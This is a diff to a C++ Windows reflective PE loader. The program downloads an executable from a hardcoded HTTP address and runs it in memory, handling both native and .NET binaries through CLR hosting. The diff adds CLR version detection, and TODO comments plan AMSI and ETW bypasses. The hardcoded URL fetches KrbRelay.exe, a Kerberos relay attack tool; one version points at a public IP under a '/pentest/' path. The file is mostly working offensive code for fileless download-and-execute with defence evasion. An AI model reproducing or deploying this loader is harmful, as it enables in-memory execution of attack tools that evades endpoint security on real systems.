@@ -3,6 +3,18 @@
 #include <wininet.h>
 #include <stdio.h>
 #include <string>
+// .NET functions can be called through COM interop from unmanaged processes [MSDN](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/dd380851(v=vs.100)?redirectedfrom=MSDN)
+// mscorlib.tlb (COM Type Library) is needed for definitions of .net types in unmanaged code when using the COM interfaces [MSDN](https://docs.microsoft.com/en-us/dotnet/framework/interop/how-to-reference-net-types-from-com)
+#include <metahost.h> // CLR v4.0 interfaces
+#include <mscoree.h>
+#pragma comment(lib, "mscoree.lib") // note: project may need to be built with mscoree.lib first for mscorlib.tlb to be recognized
+// during compilation a .tlh type library header file will be created in output folder (Debug,Release)
+// each method/function overload in COM interop is defined as func, func_2, func_3, ect
+// note: if Visual Studio can't "Go To" .tlb definitions, open .tlh file in editor
+#import <mscorlib.tlb> raw_interfaces_only			\
+    	high_property_prefixes("_get","_put","_putref")		\
+    	rename("ReportEvent", "InteropServices_ReportEvent")	\
+		rename("or", "InteropServices_or") // rename so c# symbols do not overwrite C++ functions/symbols
 
 // download file from url, returns buffer to file
 char* httpStage(LPCSTR urlStr,size_t &out_size) {
@@ -215,167 +227,17 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) 
 	return 0;
 }
 
-
-// TODO: AMSI bypass before loading
-// .NET functions can be called through COM interop from unmanaged processes [MSDN](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/dd380851(v=vs.100)?redirectedfrom=MSDN)
-// mscorlib.tlb is needed for definitions of .net types in unmanaged code when using the COM interfaces [MSDN](https://docs.microsoft.com/en-us/dotnet/framework/interop/how-to-reference-net-types-from-com)
-#include <mscoree.h>
-#pragma comment(lib, "mscoree.lib") // note: project may need to be built with mscoree.lib first for mscorlib.tlb to be recognized
-#import <mscorlib.tlb> raw_interfaces_only			\
-    	high_property_prefixes("_get","_put","_putref")		\
-    	rename("ReportEvent", "InteropServices_ReportEvent")	\
-		rename("or", "InteropServices_or") // rename so c# symbols do not overwrite C++ functions/symbols
-// .NET program is reflectively loaded using COM interop functions
-DWORD loadDotNet(void *code, size_t len, int argc, char** argv) {
-	HRESULT                  res;
-	ICorRuntimeHost          *cLRHost;
-	IUnknownPtr              appDomainCOM;
-	mscorlib::_AppDomainPtr  appDomainPtr;
-	mscorlib::_AssemblyPtr   assemblyPtr;
-	mscorlib::_MethodInfoPtr methodPtr;
-	VARIANT                  parentObject, returnVal;
-	SAFEARRAY                *safeArray;
-	SAFEARRAYBOUND           safeArrBound;
-
-	// initialize Common Language Runtime
-	res = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-	res = CoCreateInstance(
-	  CLSID_CorRuntimeHost, 
-	  NULL, 
-	  CLSCTX_ALL,
-	  IID_ICorRuntimeHost, 
-	  (LPVOID*)&cLRHost);
-	if(FAILED(res)) return 1;
-
-	// start Common Language Runtime
-	res = cLRHost->Start();
-	if (FAILED(res)) {
-		cLRHost->Release();
-		return 1;
-	}
-
-	// get CLR default domain for current process, provides container for virtual address space of managed program
-	res = cLRHost->GetDefaultDomain(&appDomainCOM);
-	if (FAILED(res)) {
-		cLRHost->Stop();
-		return 1;
-	}
-	// get interface pointer for default app domain from COM IUnknown (IUnkowns are used by COM to cast interfaces)
-	res = appDomainCOM->QueryInterface(IID_PPV_ARGS(&appDomainPtr));
-	if (FAILED(res)) {
-		appDomainCOM->Release();
-		return 1;
-	}
-
-	// create COM "array" and copy managed PE file
-	safeArrBound.lLbound   = 0;
-	safeArrBound.cElements = len;
-	safeArray = SafeArrayCreate(VT_UI1, 1, &safeArrBound);
-	if (safeArray == NULL) {
-		appDomainPtr->Release();
-		return 1;
-	}
-	CopyMemory(safeArray->pvData, code, len);
-	// load safe array into app domain
-	res = appDomainPtr->Load_3(safeArray, &assemblyPtr);
-	if (FAILED(res)) {
-		SafeArrayDestroy(safeArray);
-		return 1;
-	}
-
-	// get Main method from loaded assembly
-	res = assemblyPtr->get_EntryPoint(&methodPtr);
-	if (FAILED(res)) {
-		assemblyPtr->Release();
-		return 1;
-	}
-
-	// create COM compatible parameters argv**
-	VARIANT args;
-	args.vt = VT_ARRAY | VT_BSTR; // varient types: https://docs.microsoft.com/en-us/previous-versions/windows/embedded/ms897140(v=msdn.10)
-	SAFEARRAYBOUND argsBound[1];
-	argsBound[0].lLbound = 0;
-	argsBound[0].cElements = argc;
-	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
-	// add strings from argv to COM compatible argv
-	wchar_t wstr[256];
-	size_t size;
-	long idx[1];
-	for (int i = 0; i < argc; i++)
-	{
-		idx[0] = i;
-		mbstowcs_s(&size, wstr, 256, argv[i], 256-1);
-		SafeArrayPutElement(args.parray, idx, SysAllocString(wstr));
-	}
-	// add argument to parameter array for method
-	SAFEARRAY *params = NULL;
-	SAFEARRAYBOUND paramsBound[1];
-	paramsBound[0].lLbound = 0;
-	paramsBound[0].cElements = 1;
-	params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
-	idx[0] = 0;
-	SafeArrayPutElement(params, idx, &args);
-
-	//// get number of parameters
-	//SAFEARRAY* paramInfo = NULL;
-	//SAFEARRAYBOUND infoBound[1];
-	//infoBound[0].lLbound = 0;
-	//infoBound[0].cElements = 1;
-	//params = SafeArrayCreate(VT_VARIANT, 1, infoBound);
-	//methodPtr->GetParameters(&paramInfo);
-	//LONG  nLower = 0;
-	//SafeArrayGetLBound(paramInfo, 1, &nLower);
-	//nLower++;
-
-	// invoke method
-	parentObject.vt    = VT_NULL; // object value NULL because entry function is static
-	parentObject.plVal = NULL;
-	res = methodPtr->Invoke_3(parentObject, params, &returnVal);
-	if (FAILED(res)) {
-		_com_error err(res);
-		LPCTSTR errMsg = err.ErrorMessage();
-		wprintf(L"[!] Invoke_3 failed error message: %s", errMsg);
-		return 1;
-	}
-
-	methodPtr->Release();
-	return 0;
-}
-
 // reference: https://github.com/aaaddress1/RunPE-In-Memory Pe Loading
-// reference: https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/ .NET loading
 // 1. copy header and image sections from PE into allocated memory
 // 2. if memory could not be allocated at preferred address, rebase all absolute address in relocation table (`.reloc`)
 // 3. load all libraries/dlls in import address table(IAT) into current process
 // 4. resolve all thunks(pointer to address of function) addresses/ordinals in imported libraries and write into IAT
 // 5. execute PE with entry function
-DWORD reflectiveLoader(char* peBuffer, int len, int argc, char** argv) {
-	// parse DOS header from PE
-	// https://en.wikipedia.org/wiki/DOS_MZ_executable
-	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
-	// check if file is MS-DOS executable with DOS magic number `5A4D`
-	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-		printf("[!] file is not in PE format. (missing MS-DOS header)\n");
-		return 1;
-	}
-	// get NT header
-	// https://en.wikipedia.org/wiki/New_Executable
-	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
-	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
-		printf("[!] file is not in PE format, meant for DOS mode, and is not a 'New Executable'. (missing NT header)\n");
-		return 1;
-	}
+DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** argv) {
 	// get image size
 	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
 	// get preferred base address
 	LPVOID preferredAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
-
-	// check if PE is .NET
-	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
-		// .net doesn't need section loading for process memory, mscoree.lib handles this
-		loadDotNet(peBuffer, len, argc, argv);
-		return 0;
-	}
 
 	// unmap image base if it has been previously mapped
 	// only needed if ReflectiveLoader is loaded into a process twice?
@@ -428,6 +290,241 @@ DWORD reflectiveLoader(char* peBuffer, int len, int argc, char** argv) {
 	return 0;
 }
 
+// TODO: use CLRCreateInstance and ICLRRuntimeInfo to start initialize COM in .NET 4
+// TODO: AMSI bypass before loading
+// TODO: ETW bypass
+
+// initialize Common Language Runtime depending on versions available
+// https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/hosting-interfaces
+HRESULT loadCLR(ICorRuntimeHost** cLRHostPtr) {
+	HRESULT res;
+	HMODULE hMod;
+	FARPROC pCLRCreateInstance, pCorBindToRuntimeEx, pCorBindToRuntime;
+	ICorRuntimeHost* cLRHost;
+
+	// initialize Component Object Model library for use in thread
+	res = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+	// check for CLR version
+	hMod = LoadLibraryA("mscoree.dll"); // LoadLibraryA is used incase program is compiled with delayed loading(lib not loaded till symbol is referenced)
+	//hMod = GetModuleHandleA("mscoree");
+	if (hMod == NULL) {
+		return E_FAIL;
+	}
+	/*
+	version chart: 
+	note: CLR version of a running process can be found by looking at the path of the loaded mscorwks.dll module on CLR start
+	CLR		.NET
+	1.0 	1.0
+	1.1 	1.1
+	2.0 	2.0, 3.0, 3.5
+	4.0		4.0, 4.5, 4.6, 4.7, 4.8
+	*/
+	// CLR version can be deduced by finding which functions exist in mscoree.dll
+	pCorBindToRuntime = GetProcAddress(hMod, "CorBindToRuntime");   // CLR 1.0-1.1
+	pCorBindToRuntimeEx = GetProcAddress(hMod, "CorBindToRuntimeEx"); // CLR 2.0
+	pCLRCreateInstance = GetProcAddress(hMod,"CLRCreateInstance"); // CLR 4.0
+	// load CLR v4.0 if available, if not load CLR 2.0
+	if(pCLRCreateInstance != nullptr){
+		ICLRMetaHost* metaHost = NULL;
+		ICLRRuntimeInfo* runtimeInfo = NULL;
+		ICLRRuntimeHost* runtimeHost = NULL;
+		
+		// create interface for metahost used to enumerate CLR version
+		res = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
+		if (FAILED(res)) {
+			return res;
+		}
+		// get runtime info for CLR v4.0
+		res = metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
+		if (FAILED(res)) {
+			return res;
+		}
+		// get runtime host interface
+		res = runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost);
+		if (FAILED(res)) {
+			return res;
+		}
+		// start CLR
+		res = runtimeHost->Start();
+		if (FAILED(res)) {
+			return res;
+		}
+
+		// get old Cor runtime host interface for out param cLRHostPtr
+		res = runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)cLRHostPtr);
+
+		// free mem
+		metaHost->Release();
+		runtimeInfo->Release();
+		runtimeHost->Release();
+	}
+	else {
+		// debugging print
+		printf("[-] CLR 4.0+ not found on host, trying CLR 2.0");
+
+		// create Common Language Runtime object from its CLSID in COM
+		res = CoCreateInstance(
+		  CLSID_CorRuntimeHost, 
+		  NULL, 
+		  CLSCTX_ALL,
+		  IID_ICorRuntimeHost, 
+		  (LPVOID*)cLRHostPtr);
+		if(FAILED(res)) return res;
+
+		// start Common Language Runtime
+		cLRHost = *cLRHostPtr;
+		res = cLRHost->Start();
+		if (FAILED(res)) {
+			cLRHost->Release();
+			return res;
+		}
+	}
+
+	return S_OK;
+}
+
+// reference: https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/ .NET V2 loading
+// .NET program is reflectively loaded using COM interop functions
+HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
+	HRESULT                  res;
+	ICorRuntimeHost          *cLRHost;
+	IUnknownPtr              appDomainCOM;
+	mscorlib::_AppDomainPtr  appDomainPtr;
+	mscorlib::_AssemblyPtr   assemblyPtr;
+	mscorlib::_MethodInfoPtr methodPtr;
+	VARIANT                  parentObject, returnVal;
+	SAFEARRAY                *safeArray;
+	SAFEARRAYBOUND           safeArrBound;
+
+	// initialize Common Language Runtime depending on versions available
+	cLRHost = NULL;
+	res = loadCLR(&cLRHost);
+	if (FAILED(res)) {
+		return res;
+	}
+
+	// get CLR default domain for current process, provides container for virtual address space of managed program
+	res = cLRHost->GetDefaultDomain(&appDomainCOM);
+	if (FAILED(res)) {
+		return res;
+	}
+	// get interface pointer for default app domain from COM IUnknown (IUnkowns are used by COM to cast interfaces)
+	res = appDomainCOM->QueryInterface(IID_PPV_ARGS(&appDomainPtr));
+	if (FAILED(res)) {
+		return res;
+	}
+
+	// create COM "array" and copy managed PE file
+	safeArrBound.lLbound   = 0;
+	safeArrBound.cElements = len;
+	safeArray = SafeArrayCreate(VT_UI1, 1, &safeArrBound);
+	if (safeArray == NULL) {
+		return E_FAIL;
+	}
+	CopyMemory(safeArray->pvData, code, len);
+	// load safe array into app domain
+	res = appDomainPtr->Load_3(safeArray, &assemblyPtr);
+	if (FAILED(res)) {
+		return res;
+	}
+
+	// get Main method from loaded assembly
+	res = assemblyPtr->get_EntryPoint(&methodPtr);
+	if (FAILED(res)) {
+		return res;
+	}
+
+	// create COM compatible parameters argv**
+	VARIANT args;
+	args.vt = VT_ARRAY | VT_BSTR; // varient types: https://docs.microsoft.com/en-us/previous-versions/windows/embedded/ms897140(v=msdn.10)
+	SAFEARRAYBOUND argsBound[1];
+	argsBound[0].lLbound = 0;
+	argsBound[0].cElements = argc;
+	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
+	// add strings from argv to COM compatible argv
+	wchar_t wstr[256];
+	size_t size;
+	long idx[1];
+	for (int i = 0; i < argc; i++)
+	{
+		idx[0] = i;
+		mbstowcs_s(&size, wstr, 256, argv[i], 256-1);
+		SafeArrayPutElement(args.parray, idx, SysAllocString(wstr));
+	}
+	// add argument to parameter array for method
+	SAFEARRAY *params = NULL;
+	SAFEARRAYBOUND paramsBound[1];
+	paramsBound[0].lLbound = 0;
+	paramsBound[0].cElements = 1;
+	params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
+	idx[0] = 0;
+	SafeArrayPutElement(params, idx, &args);
+
+	//// get number of parameters (not working)
+	//SAFEARRAY* paramInfo = NULL;
+	//HRESULT hr = methodPtr->GetParameters(&paramInfo);
+	//if(hr == S_OK) {
+	//	LONG pcnt, lcnt, ucnt;
+	//	SafeArrayGetLBound(params, 1, &lcnt);
+	//	SafeArrayGetUBound(params, 1, &ucnt);
+	//	
+	//	pcnt = (ucnt - lcnt + 1);
+	//	printf("%i", pcnt);
+	//}
+
+	// invoke method
+	parentObject.vt    = VT_NULL; // object value NULL because entry function is static
+	parentObject.plVal = NULL;
+	res = methodPtr->Invoke_3(parentObject, params, &returnVal);
+	// 0x80131604 error code may indicate a .NET version issue between CLR and assembly
+	if (FAILED(res)) {
+		_com_error err(res);
+		LPCTSTR errMsg = err.ErrorMessage();
+		wprintf(L"[!] Invoke_3 failed error message: %s", errMsg);
+		return res;
+	}
+
+	cLRHost->Stop();
+
+	// free mem
+	appDomainCOM->Release();
+	appDomainPtr->Release();
+	SafeArrayDestroy(safeArray);
+	assemblyPtr->Release();
+	methodPtr->Release();
+
+	return S_OK;
+}
+
+DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
+	// parse DOS header from PE
+	// https://en.wikipedia.org/wiki/DOS_MZ_executable
+	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
+	// check if file is MS-DOS executable with DOS magic number `5A4D`
+	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+		printf("[!] file is not in PE format. (missing MS-DOS header)\n");
+		return 1;
+	}
+	// get NT header
+	// https://en.wikipedia.org/wiki/New_Executable
+	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
+	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
+		printf("[!] file is not in PE format, meant for DOS mode, and is not a 'New Executable'. (missing NT header)\n");
+		return 1;
+	}
+
+	// check if PE is .NET
+	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
+		// .net doesn't need section loading for process memory, mscoree.lib handles this
+		loadManaged(peBuffer, len, argc, argv);
+	}
+	else {
+		loadNative(peBuffer, ntHeader, argc, argv);
+	}
+
+	return 0;
+}
 
 int main(int argc, char** argv)
 {
@@ -435,7 +532,7 @@ int main(int argc, char** argv)
 	//	printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
 	//	return 0;
 	//}
-	LPCSTR url = "http://99.244.116.52:8080/pentest/krbrelay.exe";
+	LPCSTR url = "http://192.168.72.1:8000/KrbRelay.exe";
 
 	// download PE from url
 	size_t peSize;
@@ -446,6 +543,6 @@ int main(int argc, char** argv)
 	}
 
 	// call reflectiveLoader
-	reflectiveLoader(peBuffer, peSize, argc, argv);
+	reflectiveLoadPE(peBuffer, peSize, argc, argv);
 }
 
